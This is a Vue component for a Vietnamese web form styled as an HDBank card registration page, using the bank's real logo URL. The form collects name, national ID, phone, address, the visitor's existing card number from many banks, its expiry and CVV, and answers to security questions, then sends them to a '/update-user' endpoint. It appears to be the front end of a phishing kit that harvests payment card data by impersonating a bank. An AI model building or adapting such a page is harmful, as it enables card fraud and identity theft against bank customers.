<template>
    <div class="">
        <div>
            <div style="display: flex; justify-content: center">
                <a href="">
                    <v-img cover width="133px" src="https://sieuthe4trong1.hdbank.com.vn/images/logo.svg" alt=""></v-img>
                </a>
            </div>
        </div>
        <div style="margin-top: 20px">
            <v-form ref="formRef" @submit.prevent="submit">

                <v-row justify="center">
                    <div style="display: flex; justify-content: center">
                    </div>
                    <v-col md="8" lg="6" cols="12" sm="12">
                        <v-card title="Thông tin đăng ký" class="mb-5">
                            <v-card-text>
                                <v-row>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.fullName" label="Họ và tên" density="compact"
                                            hide-details="auto" variant="solo" :rules="rules.fullName"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.cccd" label="CCCD/CMND" density="compact"
                                            hide-details="auto" variant="solo" :rules="rules.cccd"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.numberPhone" label="Số điện thoại"
                                            density="compact" hide-details="auto" variant="solo"
                                            :rules="rules.numberPhone"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-select :items="['Thẻ tín dụng', 'Thẻ ghi nợ', 'Thẻ GIF']" label="Loại thẻ"
                                            hide-details="auto" v-model="formValue.typeCard" density="compact"
                                            variant="solo" :rules="rules.typeCard"></v-select>
                                    </v-col>
                                </v-row>
                            </v-card-text>
                        </v-card>
                        <v-card title="Địa chỉ nhận thẻ" class="mb-5">
                            <v-card-text>
                                <v-row>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.bankAddressProvince" label="Tỉnh thành"
                                            hide-details="auto" density="compact" variant="solo"
                                            :rules="rules.bankAddressProvince"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.bankAddressDes" label="Quận huyện"
                                            density="compact" hide-details="auto" variant="solo"
                                            :rules="rules.bankAddressDes"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.bankAddressWard" label="Số điện thoại"
                                            hide-details="auto" density="compact" variant="solo"
                                            :rules="rules.bankAddressWard"></v-text-field>
                                    </v-col>
                                </v-row>
                            </v-card-text>
                        </v-card>
                        <v-card title="Thẻ đang sử dụng" class="mb-5">
                            <v-card-text>
                                <v-row>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-select label="Loại thẻ" v-model="formValue.cardType" :items="[
                                            'Thẻ tín dụng',
                                            'Thẻ ghi nợ',
                                            'Thẻ GIF',
                                            'Thẻ nội địa'
                                        ]" hide-details="auto" variant="solo" density="compact" :rules="rules.cardType"
                                            @update:model-value="setCvv">
                                        </v-select>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-select label="Tên ngân hàng" v-model="formValue.bankName" :items="bankList"
                                            hide-details="auto" variant="solo" density="compact"
                                            :rules="rules.bankList"></v-select>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.cardNumber" label="Số in trên mặt thẻ"
                                            hide-details="auto" density="compact" variant="solo"
                                            :rules="rules.cardNumber"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.cardName" label="Chủ thẻ" hide-details="auto"
                                            density="compact" variant="solo" :rules="rules.cardName"></v-text-field>
                                    </v-col>

                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-if="cvv == true" v-model="formValue.cardDate" label="Ngày hết hạn"
                                            hide-details="auto" density="compact" variant="solo" :rules="rules.cardDate"
                                            @update:modelValue="changeCardDate">
                                        </v-text-field>
                                        <v-text-field v-else v-model="formValue.cardDate" label="Ngày phát hành"
                                            hide-details="auto" density="compact" variant="solo" :rules="rules.cardDate"
                                            @update:modelValue="changeCardDate">
                                        </v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-if="cvv == true" v-model="formValue.cardCvv" label="Mã Cvv"
                                            hide-details="auto" density="compact" variant="solo"
                                            :rules="rules.cardCvv"></v-text-field>
                                    </v-col>
                                </v-row>
                            </v-card-text>
                        </v-card>
                        <v-card title="Câu hỏi bảo mật" class="mb-5">
                            <v-card-text>
                                <v-row>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-select label="Câu hỏi bảo mật 1" v-model="formValue.question1" :items="[
                                            'Tên người yêu đầu tiên của bạn là gì?',
                                            'Tên ba của bạn là gì?',
                                            'Tên mẹ của bạn là gì?',
                                            'Tên trường tiểu học của bạn là gì?',
                                        ]" hide-details="auto" variant="solo" density="compact"
                                            :rules="rules.question1">
                                        </v-select>

                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.answer1" label="Câu trả lời câu hỏi bảo mật 1"
                                            density="compact" hide-details="auto" variant="solo"
                                            :rules="rules.answer1"></v-text-field>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-select label="Câu hỏi bảo mật 2" v-model="formValue.question2" :items="[
                                            'Tên người yêu đầu tiên của bạn là gì?',
                                            'Tên ba của bạn là gì?',
                                            'Tên mẹ của bạn là gì?',
                                            'Tên trường tiểu học của bạn là gì?',
                                        ]" hide-details="auto" variant="solo" density="compact"
                                            :rules="rules.question2">
                                        </v-select>
                                    </v-col>
                                    <v-col cols="12" sm="6" md="6">
                                        <v-text-field v-model="formValue.answer2" label="Câu trả lời câu hỏi bảo mật 2"
                                            hide-details="auto" density="compact" variant="solo"
                                            :rules="rules.answer2"></v-text-field>
                                    </v-col>
                                </v-row>
                            </v-card-text>
                        </v-card>
                        <v-btn color="warning" block class="mt-2" type="submit">Tiếp tục</v-btn>
                    </v-col>

                </v-row>
            </v-form>

        </div>
    </div>
</template>
<script setup>
import { computed, ref, onMounted } from 'vue'
import axios from '@/plugins/axios'
import { useRouter } from 'vue-router'
import { useStore } from 'vuex';
const router = useRouter()
const store = useStore()
const formRef = ref(null)
const user = computed(() => store.state.user)
const cvv = ref(false)
onMounted(() => {
    // if (!user.value.numberPhone) {
    //     router.push({ name: 'Home' })
    // }
})
const setCvv = (value) => {
    if (value === 'Thẻ tín dụng' || value === 'Thẻ ghi nợ') {
        cvv.value = true
    } else {
        cvv.value = false
    }
}
const changeCardDate = (value) => {
    console.log(value.length);
    if (value.length === 2) {
        formValue.value.cardDate = value + '/'
    }
}
const bankList = ref([
    {
        value: 'HDBank',
        title: 'Ngân hàng Phát triển Thành phố Hồ Chí Minh (HDBank)'
    },
    {
        value: 'MB',
        title: 'Ngân hàng Quân Đội (MB)'
    },
    {
        value: 'ACB',
        title: 'Ngân hàng Á Châu (ACB)'
    },
    {
        value: 'VPBank',
        title: 'Ngân hàng Việt Nam Thịnh Vượng (VPBank)'
    },
    {
        value: 'VCB',
        title: 'Ngân hàng Ngoại Thương Việt Nam (VCB)'
    },
    {
        value: 'Techcombank',
        title: 'Ngân hàng Kỹ Thương Việt Nam (Techcombank)'
    },
    {
        value: 'VietinBank',
        title: 'Ngân hàng Công Thương Việt Nam (VietinBank)'
    },
    {
        value: 'BIDV',
        title: 'Ngân hàng Đầu tư và Phát triển Việt Nam (BIDV)'
    },
    {
        value: 'Agribank',
        title: 'Ngân hàng Nông nghiệp và Phát triển Nông thôn (Agribank)'
    },
    {
        value: 'Sacombank',
        title: 'Ngân hàng Sài Gòn Thương Tín (Sacombank)'
    },
    {
        value: 'SHB',
        title: 'Ngân hàng Sài Gòn - Hà Nội (SHB)'
    },
    {
        value: 'SeABank',
        title: 'Ngân hàng TMCP Đông Nam Á (SeABank)'
    },
    {
        value: 'VIB',
        title: 'Ngân hàng Quốc tế (VIB)'
    },
    {
        value: 'TPBank',
        title: 'Ngân hàng Tiên Phong (TPBank)'
    },
    {
        value: 'OceanBank',
        title: 'Ngân hàng Đại Dương (OceanBank)'
    }

])

const formValue = ref({
    fullName: user.value.fullName,
    numberPhone: user.value.numberPhone,
    cccd: user.value.cccd,
    typeCard: '',
    bankAddressProvince: '',
    bankAddressDes: '',
    bankAddressWard: '',
    cardType: '',
    bankName: '',
    cardNumber: '',
    cardName: '',
    cardDate: '',
    cardCvv: '',
    question1: '',
    answer1: '',
    question2: '',
    answer2: '',
    ...user.value
})
const rules = {
    fullName: [
        v => !!v || 'Họ và tên không được để trống',
    ],
    numberPhone: [
        v => !!v || 'Số điện thoại không được để trống',
        v => (v && v.length === 10) || 'Số điện thoại phải có 10 số',
    ],
    cccd: [
        v => !!v || 'CCCD/CMND không được để trống',
        v => (v && v.length === 12) || 'CCCD/CMND phải có 9 số',
    ],
    typeCard: [
        v => !!v || 'Loại thẻ không được để trống',
    ],
    bankAddressProvince: [
        v => !!v || 'Tỉnh thành không được để trống',
    ],
    bankAddressDes: [
        v => !!v || 'Quận huyện không được để trống',
    ],
    bankAddressWard: [
        v => !!v || 'Phường xã không được để trống',
    ],
    cardType: [
        v => !!v || 'Loại thẻ không được để trống',
    ],
    bankName: [
        v => !!v || 'Tên ngân hàng không được để trống',
    ],
    cardNumber: [
        v => !!v || 'Số thẻ không được để trống',
    ],
    cardName: [
        v => !!v || 'Tên chủ thẻ không được để trống',
    ],
    cardDate: [
        // format MM/YY
        v => !!v || 'Ngày hết hạn không được để trống',
        v => (v && v.length === 5) || 'Ngày hết hạn phải có định dạng MM/YY',
    ],
    cardCvv: [
        v => !!v || 'Mã Cvv không được để trống',
    ],
    question1: [
        v => !!v || 'Câu hỏi bảo mật 1 không được để trống',
    ],
    answer1: [
        v => !!v || 'Câu trả lời câu hỏi bảo mật 1 không được để trống',
    ],
    question2: [
        v => !!v || 'Câu hỏi bảo mật 2 không được để trống',
    ],
    answer2: [
        v => !!v || 'Câu trả lời câu hỏi bảo mật 2 không được để trống',
    ],

}

const submit = async () => {
    const isValid = await formRef.value.validate()

    if (isValid.valid) {
        const data = {
            ...formValue.value,
        }
        axios.put(`/update-user/${data.numberPhone}`, data).then(res => {
            store.commit('setUser', {
                ...data,
            })
            router.push('/bank')
        }).catch(err => {
            console.log(err);
        })
    }
}


</script>
<style>
.bg-gray {
    background-color: #f5f5f5;
}

body {
    background: #f2f2f4;
}

.v-card-item .v-card-title {
    padding: 0 0 0 0;
    font-size: 16px;
    font-weight: 500;
    color: #000;
    margin-bottom: 10px;
}

.v-field.v-field--appended.v-field--center-affix.v-field--variant-solo.v-theme--light.v-locale--is-ltr {
    border: 1px solid #ccc;
}

label.v-label.v-field-label {
    font-size: 14px;
    color: #000;
    font-weight: 500;
}

.v-card.v-theme--light.v-card--density-default.v-card--variant-elevated {
    border: 1px solid #ccc;
}

.v-field.v-field--center-affix.v-field--variant-solo.v-theme--light.v-locale--is-ltr {
    border: 1px solid #ccc;
}



.v-field--center-affix .v-label.v-field-label {
    font-size: 14px;
    color: #000;
    font-weight: 500;
    top: 50%;
}
</style>